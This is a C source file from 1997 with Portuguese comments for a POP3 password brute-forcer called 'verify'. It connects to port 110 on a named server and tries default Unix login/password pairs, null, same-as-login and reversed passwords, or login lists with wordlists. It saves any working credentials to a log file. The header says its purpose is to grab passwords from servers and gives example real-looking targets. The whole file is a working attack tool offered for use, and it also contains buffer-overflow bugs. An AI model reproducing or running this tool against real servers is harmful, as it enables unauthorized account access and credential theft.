  /**************************************************************************/
  /*     Titulo : verify.c                                                  */
  /*     Versao : 1.42b                                                     */
  /*     Autor  : Bradock                                                   */
  /*     E-mail : bradock@usa.net                                           */
  /*     Data   : 19/10/1997                                                */
  /*     Descricao:  Este programa foi desenvolvido por bradock e tem       */
  /*                 a intensao de "catar" senhas em servidores.            */
  /*                 Existem quatro modos de verificacao das senhas:        */
  /*               * Primeiro Modo: -1                                      */
  /*                 Verifica os passwd's default's dos sistemas unix       */
  /*                 sintaxe: bash# verify pop.nasa.org -1                  */
  /*               * Segundo Modo: -2                                       */
  /*                 Verifica manuamente o login de um usuario tendo        */
  /*                 como base de tentativas:                               */
  /*                       login = (nulo)                                   */
  /*                       login = senha                                    */
  /*                       login = senha invertida                          */
  /*                       sintaxe: bash# verify pop.nasa.org -2 login      */
  /*               * Terceiro Metodo: -3                                    */
  /*                 Verifica do mesmo modo que o segundo metodo, so        */
  /*                 que tendo como base de tentativas um arquivo de logins.*/
  /*                 sintaxe: bash# verify pop.nasa.org -3 loginfile.dic    */
  /*               * Quarto Metodo: -4                                      */
  /*                 Neste metodo ele vai verificar um arquivo de logins e  */
  /*                 juntamente com uma wordlist                            */
  /*                 sintaxe: bash# verify pop.nasa.org -4 logins.txt words */
  /*               * Quinto Metodo: -5                                      */
  /*                 Esse metodo e o mais complexo porem mais demorado      */
  /*                 ele vai verificar no servidor os logins agora como     */
  /*                 base de tentivas o arquivo de login e o arquivo de     */
  /*                 wordlist e ainda por cima como no metodo -2            */
  /*                                                                        */
  /*    -> AtUaLiZaCoES <-                                                  */
  /*                                                                        */
  /*   Versao 1.4:                                                          */
  /*  1) Adicionado a porcentagem para vc ter uma nocao de quanto tempo     */
  /*     falta para terminar as tentativas                                  */
  /*  2) Adicionado a opcao de recuperacao segura caso o programa trave ou  */
  /*     ocorra uma desconexao do servidor permitindo que vc tente mais tarde*/
  /*     continuando de onde vc havia parado.                               */
  /**************************************************************************/


                /***  Para Compilar digite:****/
                /* gcc -o verify verify.c  ou */
                /* cc  -o verify verify.c     */
                /******************************/

  #include <sys/param.h>
  #include <sys/socket.h>
  #include <netinet/in.h>

  #include <stdio.h>
  #include <string.h>
  #include <signal.h>
  #include <unistd.h>
  #include <netdb.h>
  #include <stdarg.h>
  #include <termios.h>

  #define TRUE 1
  #define FALSE !TRUE

  #define DEFAULT_PORT 110
  #define VERSION "1.42b"
  #define _DEBUG_

  #define SERVER_PATH "server.log"
  #define VERIFY_PATH "verify.log"
  #define VERIFY_TMP "/tmp/verify.tmp"

  #define VERIFY_HACK_DEFAULT 0
  #define VERIFY_HACK_LOGIN   1
  #define VERIFY_HACK_DICT    2
  #define VERIFY_HACK_BRUTE   3

  struct verify_type
   {
     char hostname[1024];  /* hostname                       */
     int verify_mode;      /* Tipo do ataque                 */
     int yo;               /* HackDefault Number             */
     char userfile[1024];  /* Nome do arquivo de usuario     */
     char wordfile[1024];  /* Nome do arquivo de wordlist    */
     long curpos_userfile; /* Posicao no arquivo do user     */
     long curpos_wordfile; /* Posicao no arquivo de wordlist */
     int calc_atual;       /* Calculo de Porcentagem         */
     int percent_total;    /* Calculo de Porcentagem         */
     int percent_atual;    /* Calculo de Porcentagem         */
   } verify;

  void start (void);
  int conecta (char *server, int port);
  void reconnect (void);
  int verifica (char *username, char *password);
  char *getanswer (char *buff);
  void reverse (char *str1, char *str2);
  void get_status (FILE *fp);
  void write_sets (FILE *fp);
  void print_status (void);
  int file_exist (char *filename);
  int handler (int unused);
  void getkey (char *key);
  int hack_login (char *username);
  void hack_default (int inicio);
  void hack_ldicts (char *filename);
  void hack_dict (char *loginfile, char *pwdfile);
  void hack_brute_dict (char *loginfile, char *pwdfile);
  void end (void);


 FILE *pop, *server_log, *pass_file = NULL;
 FILE *username_file, *wordfile = NULL;
 int connect_sock;
 int error = FALSE;
 int restart = FALSE;

 char *login[] =
   {
   "root", "root", "root","root",
   "bin","bin",
   "daemon", "daemon",
   "adm", "adm", "adm",
   "admin", "admin", "admin",
   "lp", "lp",
   "sync", "sync",
   "shutdown", "shutdown",
   "halt", "halt",
   "mail", "mail",
   "news", "news",
   "uucp", "uucp",
   "tty", "tty",
   "operator", "operator",
   "games", "games", "games",
   "man", "man",
    "sysman", "sysman", "sysman", "sysman",
    "postmaster", "postmaster",
    "nobody", "nobody",
    "ftp", "ftp",
    "guest", "guest",
    "sys", "sys", "sys",
    "test", "test",
    "unix", "unix", "unix",
    "sysadmin", "sysadmin", "sysadmin", "sysadmin", "sysadmin", "sysadmin",
    "who", "who",
    "leran", "learn",
    "uuhost", "uuhost",
    "host", "host",
    "nuucp", "nuucp",
    "rje", "rje",
    "sysop", "sysop",
    "demo","demo"
   };

    char *passwd[] =
   {
     "\0", "root", "system", "sysop",
     "\0", "bin",
     "\0", "daemon",
     "\0", "adm", "admin", "\0", "adm", "admin",
     "\0", "lp", "\0", "sync",
     "\0", "shutdown", "\0", "halt", "\0", "mail", "\0", "news",
     "\0", "uucp", "\0", "tty", "\0", "operator", "\0", "games", "player",
     "\0", "man", "\0", "sys", "sysman", "system", "\0", "postmaster",
     "\0", "nobody", "\0", "ftp", "\0", "guest", "\0", "sys", "system",
     "\0", "test", "\0", "unix", "test", "\0", "sysadmin", "sys", "system",
     "admin", "adm", "\0", "who", "\0", "learn", "\0", "uuhost", "\0", "host",
     "\0", "nuucp", "\0", "rje" , "\0", "sysop", "\0", "demo"
     };

void start (void)
{
   FILE *fp = NULL;
   char ch[2];

   if(file_exist(VERIFY_TMP) == TRUE)
     {
       printf("A ultima tentativa nao foi terminada com sucesso\n");
       printf("Deseja continuar de onde parou?(S\\n):");

       getkey(ch);
       printf("\n");

       if(!strcmp(ch, "S") || !strcmp(ch, "s"))
        {
           signal(SIGINT, handler);
           restart = TRUE;
           fp = fopen(VERIFY_TMP, "rb");
           if(fp == NULL)
             {
               fprintf(stderr, "Erro: Abrindo %s\n", VERIFY_TMP);
               exit(-1);
             }
           fread(&verify, sizeof(verify), 1, fp);
           fclose(fp);

         if((server_log=fopen(SERVER_PATH, "a")) == NULL)
           fprintf(stderr, "Erro: Gravando o arquivo %s\n", SERVER_PATH);
         if((pass_file=fopen(VERIFY_PATH, "a")) == NULL)
           fprintf(stderr, "Erro: Gravando o arquivo %s\n", VERIFY_PATH);

               switch(verify.verify_mode)
                 {
                   case VERIFY_HACK_DEFAULT:
                   printf("Recomecando [ hack_default(%d) ]\n", verify.yo);
                   hack_default(verify.yo);
                   break;
                   case VERIFY_HACK_LOGIN:
                   printf("Recomecando [ hack_ldicts(%s) ]\n", verify.userfile)
;
                   hack_ldicts(verify.userfile);
                   break;
                   case VERIFY_HACK_DICT:
                   printf("Recomecando [ hack_dict(%s, %s) ]\n", verify.userfile, verify.wordfile);
                   hack_dict(verify.userfile, verify.wordfile);
                   break;
                   case VERIFY_HACK_BRUTE:
                   printf("Recomecando [ hack_brute_dict(%s, %s) ]\n", verify.userfile, verify.wordfile);
                   hack_brute_dict(verify.userfile, verify.wordfile);
                   break;
                   default:
                   fprintf(stderr, "Erro: Modo de ataque desconhecido\n");
                   exit(-1);
                   break;
                 }
           unlink(VERIFY_TMP);
           end();
           printf("Done. Please check file logs!\n");
           exit(0);
        }
 }
     if((server_log=fopen(SERVER_PATH, "w+")) == NULL)
        fprintf(stderr, "Erro: Gravando o arquivo %s\n", SERVER_PATH);
     if((pass_file=fopen(VERIFY_PATH, "w+")) == NULL)
        fprintf(stderr, "Erro: Gravando o arquivo %s\n", VERIFY_PATH);

}

 int conecta (char *server, int port)
  {
   char tmp[100];
   struct sockaddr_in sin;
   struct hostent *hp;


   hp=gethostbyname(server);
   if(hp==NULL) return FALSE;

   bzero((char *)&sin,sizeof(sin));
   bcopy(hp->h_addr,(char *)&sin.sin_addr,hp->h_length);
   sin.sin_family = AF_INET;
   sin.sin_port   = htons(port);
   connect_sock   = socket(AF_INET, SOCK_STREAM, 0);
   if(connect(connect_sock,(struct sockaddr *)&sin,sizeof(sin))<0) return FALSE
;

   pop = fdopen(connect_sock, "rt");
   if(pop == NULL) return FALSE;
   getanswer(tmp);
   fprintf(server_log, "%s\n", tmp);

   return TRUE;
  }


void reconnect (void)
{
 char buff[12];

  strcpy(buff, "QUIT\n");
  send(connect_sock, buff, strlen(buff), 0);
  close(connect_sock);

   if(conecta(verify.hostname, DEFAULT_PORT) == FALSE)
   {
     fprintf(stderr, "Erro: Nao foi possivel reconectar a %s\n", verify.hostname);
     error = TRUE;
     end();
     exit(-1);
   }
 }

int verifica (char *username, char *password)
{
   char buff[512];

   sprintf(buff, "USER %s\n", username);
   send(connect_sock, buff, strlen(buff), 0);
   fprintf(server_log, "%s", buff);
   getanswer(buff);
   fprintf(server_log, buff);
   fprintf(server_log, "\n");

   bzero((char *)&buff, sizeof(buff));
   sprintf(buff, "PASS %s\n", password);
   send(connect_sock, buff, strlen(buff), 0);
   fprintf(server_log, "%s", buff);
   getanswer(buff);
   fprintf(server_log, buff);
   fprintf(server_log, "\n");
   fflush(server_log);

   if(strstr(buff, "+OK") != NULL)
     {
      fprintf(stdout, "USERNAME: %s\nPASSWORD: %s\n\n", username, password);
      fprintf(pass_file, "USERNAME: %s\nPASSWORD: %s\n\n", username, password);
      fflush(pass_file);
      reconnect();
      return TRUE;
     }
   else {
    reconnect();
    return FALSE;
  }
}

char *getanswer (char *buff)
{
   int ch;
   char *in=buff;

    for(;;)
     {
      while(TRUE)
       {
         ch=fgetc(pop);
         if(ch == '\n')
            {
              *in='\0';
               break;
             }
            else
             {
               *in=(char)ch;
                in++;
             }

       }
          if(strstr(buff, "+OK") != NULL) return buff;
          if(strstr(buff, "-ERR") != NULL) return buff;
     }
}

void reverse (char *str1, char *str2)
 {
     int length, i;

     length = strlen(str1);

     for(i = 0; i < length; i++)
        str2[i] = (&str1[length-i]) [-1];
        str2[length] = '\0';
}


void get_status (FILE *fp)
{
  unsigned char tmp[50];

  printf("Carregando logins um momento ...\n");
  while(!feof(fp))
    {
      bzero((char *)&tmp, sizeof(tmp));
      if(fgets(tmp, 13, fp) == NULL) break;
      verify.percent_total++;
    }

   printf("Status:\n");
   printf("Total de Logins: %d\n", verify.percent_total);
   printf("Iniciando processo ...\n\n");
   if(verify.verify_mode = VERIFY_HACK_BRUTE) verify.percent_total++;
   print_status();
   fseek(fp, 0, SEEK_SET);
}

void write_sets (FILE *fp)
{
    switch(verify.verify_mode)
      {
        case VERIFY_HACK_LOGIN:
        verify.curpos_userfile = ftell(username_file);
        break;
        case VERIFY_HACK_DICT:
        verify.curpos_userfile = ftell(username_file);
        verify.curpos_wordfile = ftell(wordfile);
        break;
        case VERIFY_HACK_BRUTE:
        verify.curpos_userfile = ftell(username_file);
        verify.curpos_wordfile = ftell(wordfile);
        break;
      }
    fwrite(&verify, sizeof(verify), 1, fp);
 }

void print_status (void)
{
  if(verify.percent_total > 0)
  verify.percent_atual = (int)((verify.calc_atual * 100) / verify.percent_total
);
       else verify.percent_atual = 0;
  printf("%d%%\n", verify.percent_atual);
  verify.calc_atual++;
}

int file_exist(char *filename)
{
  FILE *fp;
  int result;

  if((fp=fopen(filename, "rt")) == NULL)
              result = FALSE;
                   else result = TRUE;
  fclose(fp);
  return(result);
}

int handler (int unused)
 {
   FILE *fp = NULL;

   printf("CTRL+C Pressionado! Saindo...\n");
   if((fp=fopen(VERIFY_TMP, "wb+")) == NULL)
        fprintf(stderr, "Erro: Gravando em %s\n", VERIFY_TMP);
         else
           {
              write_sets(fp);
              fclose(fp);
            }
   end();
   exit(-1);
   return(0);
 }

void getkey (char *key)
{
 static struct termios old, new;

  tcgetattr(fileno(stdin), &old);
  memcpy(&new, &old, sizeof(struct termios));
  new.c_lflag &= ~(ICANON|ECHO);
  tcsetattr(fileno(stdin), TCSANOW, &new);
  fgets(key, 2, stdin);
  tcsetattr(fileno(stdin), TCSANOW, &old);
}

 int hack_login (char *username)
 {
   char pass[12];
   int result = FALSE;

   if(!username)  return FALSE;

   strcpy(pass, "\0");
   result = verifica(username, pass);
   if(result == TRUE) return result;

   strcpy(pass, username);
   result = verifica(username, pass);
   if(result == TRUE) return result;

   reverse(username, pass);
   result = verifica(username, pass);

   return result;
 }

void hack_default (int inicio)
{
  unsigned char tmp[12];
  verify.percent_total = 77;

  verify.verify_mode = VERIFY_HACK_DEFAULT;

  if(inicio < 0 || inicio > verify.percent_total) inicio = 0;

  for(verify.yo=inicio; verify.yo < 78; verify.yo++)
   {
     if(strcmp(login[verify.yo], tmp)) {
     print_status();
     if(verifica(login[verify.yo], passwd[verify.yo]) == TRUE)
          {
           strcpy(tmp, login[verify.yo]);
          }
      }
   }
}

void hack_ldicts (char *filename)
{
 char *tmp;
 unsigned char login_atual[12];

 if((username_file=fopen(filename, "rt")) == NULL)
    {
      fprintf(stderr, "Erro: Abrindo arquivo %s \n", filename);
      end();
      exit(-1);
    }

 if(restart == TRUE)
  {
  fseek(username_file, verify.curpos_userfile, SEEK_SET);
  } else {
    strcpy(verify.userfile, filename);
    get_status(username_file);
  }

 verify.verify_mode = VERIFY_HACK_LOGIN;
 while(!feof(username_file))
  {
  bzero((char *)&login_atual, sizeof(login_atual));
  if(fgets(login_atual, 12, username_file) == NULL) break;
   tmp=strchr(login_atual, 10);
   if(tmp!=NULL) *tmp=0;
  if(login_atual[0]) {
    print_status();
    hack_login(login_atual);
    }
  }
 fclose(username_file);
}

void hack_dict (char *loginfile, char *pwdfile)
{
  char *tmp;
  unsigned char login_atual[12], pwd_atual[12];
  int fim = FALSE;
  int final_pwd = FALSE;


  if((username_file=fopen(loginfile, "rt")) == NULL) {
    fprintf(stderr, "Erro: Nao foi possivel abrir %s \n", loginfile);
    end();
    exit(-1);
    }
  if((wordfile=fopen(pwdfile, "rt")) == NULL) {
   fprintf(stderr, "Erro: Nao foi possivel abrir %s \n", pwdfile);
   end();
   exit(-1);
  }


  if(restart == TRUE)
   {
     fseek(username_file, verify.curpos_userfile, SEEK_SET);
     fseek(wordfile, verify.curpos_wordfile, SEEK_SET);
   } else {
     strcpy(verify.userfile, loginfile);
     strcpy(verify.wordfile, pwdfile);
     get_status(username_file);
   }

 verify.verify_mode = VERIFY_HACK_DICT;
 while(!feof(username_file))
  {
    if(final_pwd == TRUE || feof(wordfile)) fseek(wordfile, 0, SEEK_SET);
    bzero((char *)&login_atual, sizeof(login_atual));
    if(
      fgets(login_atual, 13, username_file) == NULL
      ) break;

      tmp=strchr(login_atual, 10);
      if(tmp!=NULL) *tmp=0;
      print_status();

     for(;;)
      {
       if(
       fgets(pwd_atual, 13, wordfile) == NULL
         ) { final_pwd = TRUE; break; }
          fim = verifica(login_atual, pwd_atual);
          if(fim == TRUE) { fim = FALSE; fseek(wordfile, 0, SEEK_SET); break; }
      }
  }
}

void hack_brute_dict (char *loginfile, char *pwdfile)
{
  char *tmp;
  unsigned char login_atual[12], pwd_atual[12];
  int fim = FALSE;
  int final_pwd = FALSE;

  if((username_file=fopen(loginfile, "rt")) == NULL) {
    fprintf(stderr, "Erro: Nao foi possivel abrir %s \n", loginfile);
    end();
    exit(-1);
    }
  if((wordfile=fopen(pwdfile, "rt")) == NULL) {
   fprintf(stderr, "Erro: Nao foi possivel abrir %s \n", pwdfile);
   end();
   exit(-1);
  }


  if(restart == TRUE)
   {
     fseek(username_file, verify.curpos_userfile, SEEK_SET);
     fseek(wordfile, verify.curpos_wordfile, SEEK_SET);
   } else {
     strcpy(verify.userfile, loginfile);
     strcpy(verify.wordfile, pwdfile);
     get_status(username_file);
   }

 verify.verify_mode = VERIFY_HACK_BRUTE;
 while(!feof(username_file))
  {
    if(final_pwd == TRUE || feof(wordfile)) fseek(wordfile, 0, SEEK_SET);
    bzero((char *)&login_atual, sizeof(login_atual));
    if(
      fgets(login_atual, 13, username_file) == NULL
      ) break;

      tmp=strchr(login_atual, 10);
      if(tmp!=NULL) *tmp=0;
      print_status();

     for(;;)
      {
       if(
       fgets(pwd_atual, 13, wordfile) == NULL
         ) { final_pwd = TRUE; break; }
          fim = verifica(login_atual, pwd_atual);
          if(fim == FALSE)
          fim = hack_login(login_atual);
          if(fim == TRUE)
                     {
                       fim = FALSE;
                       fseek(wordfile, 0, SEEK_SET);
                       break;
                    }
      }
  }
}


void end (void)
{
 FILE *fp = NULL;

  close(connect_sock);
  fclose(pop);
  fclose(server_log);
  fclose(pass_file);
  if(error == TRUE)
    {
   if((fp=fopen(VERIFY_TMP, "wb+")) == NULL)
       {
         fprintf(stderr, "Erro: Gravando %s\n", VERIFY_TMP);
       } else
    {
     write_sets(fp);
     fclose(fp);
    }
  }
}

main (int argc, char *argv[])
{
  printf("\n              Verify Versao %s \n", VERSION);
  printf("                By Br4d0ck (bradock@usa.net)\n\n");
  if(argc <= 1) {
  printf("Sintaxe: %s servidor [opcao] [argumento]  \n", argv[0]);
  printf("servidor : Servidor que deseja fazer a tentativa \n");
  printf("opcao    : Os modos de verificao o default eh -1 \n");
  printf("argumento: O argumento adcional que cada opcao requer \n");
  printf("\n Exemplos : \n %s nasa.org \n %s nasa.org -2 rogger \n", argv[0], argv[0]);
  printf("para maiores informacoes digite -h ou -?\n");
  return(0);
  }
  if(!strcmp(argv[1], "-h") || !strcmp(argv[1], "-?"))
    {
      printf("Verify foi desenvolvido por Bradock (bradock@usa.net)\n");
      printf("Este programa verifica se o server especificado atraves\n");
      printf("de opcoes tem passwd's respectivos ao que vc deseja saber.\n\n");
      printf("                 [[Opcoes]]\n\n");
      printf("-1 ( default ): Verifica os passwd's default do sistema unix\n");
      printf("    Sintaxe : %s server -1\n", argv[0]);
      printf("-2: Verifica manualmente um login\n");
      printf("    Sintaxe : %s server -2 login\n", argv[0]);
      printf("-3: Verifica com uma lista de logins\n");
      printf("    Sintaxe : %s server -3 loginfile.txt\n", argv[0]);
      printf("-4: Verifica com uma lista de logins e uma wordlist\n");
      printf("    Sintaxe:%s server -4 loginfile.txt wordlist.dic\n", argv[0]);
      printf("-5: Enquadra todos os metodos \n");
      printf("    Sintaxe: %s server -5 loginfile.txt wordlist.dic\n\n", argv[0
]);
      printf("Have a Phun !!!\n\n");
      return(0);
    }

  strcpy(verify.hostname, argv[1]);
  start();
  signal(SIGINT, handler);

 if(conecta(verify.hostname, DEFAULT_PORT) == FALSE)
  {
    fprintf(stderr, "Nao foi possivel conectar a %s \n", argv[1]);
    return(-1);
  }
   printf("Conectado a [%s] : %d \n", verify.hostname, DEFAULT_PORT);
   fprintf(pass_file, "Verify Versao %s \nBy Br4d0ck (bradock@usa.net)\n\n%s :
\n", VERSION, verify.hostname);

 for(;;)
  {
  if(argv[2])
   {
    if(!strcmp(argv[2], "-2")) { hack_login(argv[3]); break; }
    if(!strcmp(argv[2], "-3")) { hack_ldicts(argv[3]); break; }
    if(!strcmp(argv[2], "-4")) { hack_dict(argv[3], argv[4]); break; }
    if(!strcmp(argv[2], "-5")) { hack_brute_dict(argv[3], argv[4]); break; }
   }
  hack_default(0); break;
  }
    end();
    printf("Done. Please check file logs!\n");

 return(0);
}
